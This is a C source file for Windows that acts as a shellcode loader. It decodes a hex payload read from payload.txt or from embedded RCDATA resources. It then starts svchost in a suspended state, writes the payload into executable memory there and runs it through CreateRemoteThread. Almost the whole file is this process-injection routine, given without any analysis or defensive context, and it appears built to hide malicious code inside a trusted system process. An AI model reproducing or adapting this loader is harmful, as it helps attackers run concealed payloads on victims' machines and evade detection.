#include <stdio.h>
#include <windows.h>

int strcmp(const char *l, const char *r) {
  for (; *l == *r && *l; l++, r++) {
  }
  return *(unsigned char *)l - *(unsigned char *)r;
}

char *convert(long *rawSize, const char *text) {
  long textSize = strlen(text);
  *rawSize = textSize / 2;
  char *raw = (char *)malloc(*rawSize);

  for (size_t i = 0; i < textSize; i += 2) {
    sscanf(text + i, "%2x", &raw[i / 2]);
  }

  return raw;
}

char *readFile(long *rawSize) {
  FILE *file = fopen("payload.txt", "rb");

  fseek(file, 0, SEEK_END);
  long fileSize = ftell(file);
  rewind(file);

  char *text = (char *)malloc(fileSize + 1);
  fread(text, sizeof(char), fileSize, file);
  text[fileSize] = 0;
  fclose(file);

  char *raw = convert(rawSize, text);
  free(text);

  return raw;
}

char *readResource(long *rawSize) {
  char *text = NULL;
  for (int i = 0, len = 0; i < 50; i++) {
    char *res = LoadResource(0, FindResource(0, MAKEINTRESOURCE(i), RT_RCDATA));
    len += strlen(res);
    text = (char *)realloc(text, len);

    if (i == 0) {
      strcpy(text, res);
    } else {
      strcat(text, res);
    }
  }

  char *raw = convert(rawSize, text);
  free(text);

  return raw;
}

int main(int argc, char *argv[]) {
  long rawSize;
  char *raw;

  if (argc != 2) {
    return 0;
  }
  char *flag = argv[1];

  if (strcmp(flag, "f") == 0) {
    raw = readFile(&rawSize);
  } else if (strcmp(flag, "r") == 0) {
    raw = readResource(&rawSize);
  } else {
    return 0;
  }

  STARTUPINFO si = {0};
  PROCESS_INFORMATION pi = {0};
  CreateProcess(0, "svchost", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

  void *ptr = VirtualAllocEx(pi.hProcess, 0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(pi.hProcess, ptr, raw, rawSize, 0);
  CreateRemoteThread(pi.hProcess, 0, 0, ptr, 0, 0, 0);

  free(raw);

  return 0;
}

/*
  short *wstr;
  int size = LoadStringW(0, 123, (short *)&wstr, 0); // STRINGTABLE
  printf("%ls\n", wstr);

  // 宽字节 -> 多字节
  char *str = (char *)malloc(size + 1);
  wcstombs(str, wstr, size);
  str[size] = 0;
  printf("%s\n", str);
  free(str);
*/

/*
https://git.musl-libc.org/cgit/musl/tree/src/string/strcmp.c
*/
